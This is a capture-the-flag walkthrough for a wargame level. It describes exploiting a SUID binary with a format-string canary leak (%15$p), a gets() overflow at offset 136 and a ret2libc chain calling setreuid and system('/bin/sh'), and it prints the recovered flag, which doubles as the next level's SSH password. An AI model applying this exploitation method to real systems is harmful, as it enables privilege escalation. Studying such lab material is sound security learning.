# level09 — walkthrough

**Binary:** `/home/level09/neuromancer` (SUID `flag09`, x86-64) — **no source**
**Goal:** read `/home/flag09/.pass`

## Recon
```
checksec: No PIE (0x400000), NX ON, stack canary, ASLR off.
main -> handle_command(): info_leak(); console_handshake(); process_input();
```
`info_leak` even prints `puts@libc: 0x...` for free (ASLR is off, so we already
know the base — a red herring / convenience).

## Bugs (same recipe as level06)
* `console_handshake`: `fgets(buf,0x40); ...; printf(buf);` → format string,
  leaks the **canary** at `%15$`.
* `process_input`: `gets(buf@rbp-0x90)` → overflow, `buf[0x88]` is the canary
  (**offset 136**).

## Exploit
1. Send `%15$p` → canary.
2. Overflow: `['A'*136][canary]['A'*8][ret2libc]`.
3. Chain: `setreuid(1026,1026)` + `system("/bin/sh")` (movaps-aligned), command
   fed on stdin. Leak+overflow in one process (subprocess) so the canary matches.

## Run
```
python3 exploit.py
-> kl9th7ox72218n3jlf554eymtlaynogo
```

**flag09 = `kl9th7ox72218n3jlf554eymtlaynogo`** (SSH password for level10)
